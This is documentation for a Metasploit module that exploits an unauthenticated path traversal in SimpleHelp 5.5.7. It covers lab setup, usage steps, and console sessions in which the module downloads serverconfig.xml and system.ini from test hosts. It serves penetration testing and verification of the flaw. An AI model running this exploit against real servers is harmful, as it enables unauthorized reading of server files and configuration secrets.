## Vulnerable Application
There exists a path traversal vulnerability in the /toolbox-resource endpoint of SimpleHelp that enables unauthenticated
remote attackers to download arbitrary files from the SimpleHelp server via crafted HTTP requests

### Setup

On Ubuntu 22.04 download a vulnerable version of SimpleHelp, for this demo we will use 5.5.7:
`wget https://simple-help.com/releases/5.5.7/SimpleHelp-linux-amd64.tar.gz`

Unzip the application:
```
cd /opt
tar -xvf SimpleHelp-linux-amd64.tar.gz
```

Start the server:
```
cd SimpleHelp
sudo sh serverstart.sh
```

Navigate to the Web App GUI at: `http://127.0.0.1` (by default the application should be listening on all interfaces).
You should see "Welcome to your new SimpleHelp Server".
Select "Start New Server". The application should now be vulnerable to the path traversal.

## Verification Steps

1. Start msfconsole
1. Do: `use simplehelp_toolbox_path_traversal`
1. Set the `RHOST`
1. Run the module
1. Receive the file `serverconfig.xml` from the SimpleHelp

## Scenarios
### SimpleHelp 5.5.7 running on Ubuntu 22.04
```
msf6 exploit(windows/local/cve_2024_35250_ks_driver) > use simplehelp_toolbox_path_traversal

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank    Check  Description
   -  ----                                                      ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/simplehelp_toolbox_path_traversal  2025-01-12       normal  No     Simple Help Path Traversal Vulnerability


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/simplehelp_toolbox_path_traversal

[*] Using auxiliary/scanner/http/simplehelp_toolbox_path_traversal
msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > set rhost 172.16.199.130
rhost => 172.16.199.130
msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > run
[*] Reloading module...
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: 5.5.7
[+] Downloaded 5233 bytes
[+] File saved in: /Users/jheysel/.msf4/loot/20250220163655_default_172.16.199.130_simplehelp.trave_035651.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### SimpleHelp 5.5.7 running on Windows 11
```
msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > set rhosts 172.16.199.131
rhosts => 172.16.199.131
msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > set filepath windows/system.ini
filepath => windows/system.ini
msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > set depth 4
depth => 4
msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > run
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version detected: 5.5.7
[+] Downloaded 219 bytes
[+] File saved in: /Users/jheysel/.msf4/loot/20250221075039_default_172.16.199.131_simplehelp.trave_820456.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/http/simplehelp_toolbox_path_traversal) > cat /Users/jheysel/.msf4/loot/20250221075039_default_172.16.199.131_simplehelp.trave_820456.txt
[*] exec: cat /Users/jheysel/.msf4/loot/20250221075039_default_172.16.199.131_simplehelp.trave_820456.txt

; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]
```
